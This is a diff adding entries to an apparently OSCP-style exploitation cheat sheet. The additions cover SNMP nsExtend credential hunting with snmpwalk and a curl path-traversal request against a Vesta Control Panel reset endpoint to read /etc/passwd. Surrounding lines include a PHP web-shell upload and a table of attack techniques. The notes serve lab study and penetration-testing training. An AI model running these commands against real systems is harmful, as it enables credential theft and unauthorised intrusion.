@@ -67,6 +67,12 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
      ```
   2. **Upload (Kali)**: `curl -X PUT http://192.168.100.50/storage/download.php --data-binary @download.php`
   3. **Trigger**: Visit `http://192.168.100.20/storage/download.php` `[Feast]`.
+- **SNMP Custom Script Enumeration** - **Do this:** Check for custom scripts or passwords in SNMP `nsExtendObjects`:
+  - `snmpwalk -v 2c -c public [IP] NET-SNMP-EXTEND-MIB::nsExtendObjects`
+  - `snmpwalk -v 2c -c public [IP] .1.3.6.1.4.1.8072.1.3` (Manual OID fallback)
+  - *HUNT*: Inspect `nsExtendOutputFull` for cleartext credentials or script outputs `[OSCPC]`.
+- **Vesta Control Panel LFI/RCE** - **Do this:** Attack vulnerable Vesta CP reset endpoint:
+  `curl -k "https://192.168.100.20:8083/api/v1/reset/index.php?action=confirm&user=admin&code=../../../../../../../../etc/passwd"` `[OSCPC]`
 
 ---
 
@@ -262,6 +268,8 @@ A chronological, phase-based tactical guide for Active Directory exploitation. S
 | **Shadow Credentials** | `Universal` | pywhisker PFX exploit |
 | **Session Poisoning** | `Sniper` | \windows\temp\sess_12345 Inject |
 | **.htaccess Bypass** | `Access` | AddType x-httpd-php .php16 |
+| **SNMP nsExtend** | `OSCPC` | Password extraction from custom scripts |
+| **Vesta CP LFI** | `OSCPC` | Reset endpoint directory traversal |
 
 ---
 
